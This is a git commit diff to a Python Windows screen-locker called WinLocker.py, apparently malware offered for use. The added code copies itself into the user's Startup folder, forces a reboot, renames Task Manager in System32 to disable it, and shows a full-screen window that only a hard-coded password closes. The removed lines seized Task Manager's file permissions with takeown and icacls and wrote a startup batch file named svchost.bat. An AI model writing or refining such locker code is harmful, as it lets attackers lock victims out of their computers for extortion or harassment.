c59963a7f7877df07cc3672229c1087efe6a87ca
Xsarz <88231084+xXxCLOTIxXx@users.noreply.github.com>
2023-09-07 09:53:35 +0300

    Update WinLocker.py

--- WinLocker.py
+++ WinLocker.py
@@ -2,11 +2,18 @@ import tkinter
 from tkinter import messagebox
 from getpass import getuser
 import pyautogui
-from os import rename, system
+from os import rename, system, listdir
 from os.path import realpath, dirname
-import sys
+from sys import argv
+from shutil import copyfile
+
 pyautogui.FAILSAFE = False
 user = getuser()
+name=argv[0].split('\\')[-1]
+window = tkinter.Tk()
+path1 = "C:\Windows\System32\Taskmgr.exe"
+path2 = "C:\Windows\System32\sys_32.exe"
+
 
 #------------------------------------------------------------
 password = "12345" #Пароль для отключения
@@ -26,22 +33,11 @@ pyinstaller -w -F WinLocker.py
 #------------------------------------------------------------
 
 
-def startup():
-	path = dirname(realpath(__file__))
-	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user
-	with open(f"{bat_path}\\svchost.bat", "w+") as bat_file:
-		bat_file.write(fr'start {sys.argv[0]}')
 
-def block_Taskmgr():
-	try:
-		path1 = "C:\Windows\System32\Taskmgr.exe"
-		path2 = "C:\Windows\System32\Taskmgr1.exe"
-		system("takeown /f C:\Windows\System32\Taskmgr.exe")  
-		system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
-		system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
-		system("taskkill /im taskmgr.exe")
-		rename(path1, path2)
-	except:pass
+def copy():
+	file = f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{name}'
+	copyfile(argv[0], file)
+
 
 def close_block():
     pyautogui.moveTo(x=0,y=0)
@@ -51,11 +47,33 @@ def close_block():
 
 
 def accept_password(input_passwords):
-	if input_passwords == password:window.destroy()
+	if input_passwords == password:
+		window.destroy()
+		try:rename(path2, path1)
+		except: pass
 	else:messagebox.showerror(title, password_error)
 
 
-window = tkinter.Tk()
+def start():
+	try:rename(path1, path2)
+	except: pass
+	close_block()
+	window.mainloop()
+
+
+
+def on_start():
+	if name not in listdir(f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"):
+		copy()
+		system("shutdown -r -t 1")
+	else:
+		if argv[0] == f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}':start()
+
+
+
+
+
+
 window.title(title)
 
 width = window.winfo_screenwidth()
@@ -77,7 +95,6 @@ title_lbl.grid(column=0, row=0)
 text_lbl.grid(column=0, row=1, pady=5)
 password_entry.grid(column=0, row=2, pady=5)
 accept_password_btn.grid(column=0, row=3, pady=15)
-startup()
-block_Taskmgr()
-close_block()
-window.mainloop()
+
+
+on_start()
